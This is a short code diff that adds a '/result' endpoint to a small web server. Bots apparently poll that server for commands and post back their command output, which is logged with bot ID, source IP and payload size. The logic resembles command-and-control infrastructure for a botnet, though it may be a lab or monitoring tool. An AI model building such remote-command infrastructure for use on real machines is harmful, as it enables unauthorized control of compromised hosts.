@@ -67,3 +67,14 @@ def get_command(bot_id):
         return {"status": "command", "command": cmd}
     
     return {"status": "idle"}
+
+@app.post("/result")
+def post_result(request: CommandResultRequest):
+    insert_log(
+        bot_id = request.bot_id,
+        event_type="result",
+        source_ip=request.source_ip,
+        payload_size=len(request.output),
+        metadata={"command_id": request.command_id, "output": request.output},
+    )
+    return {"status": "received", "command_id": request.command_id}
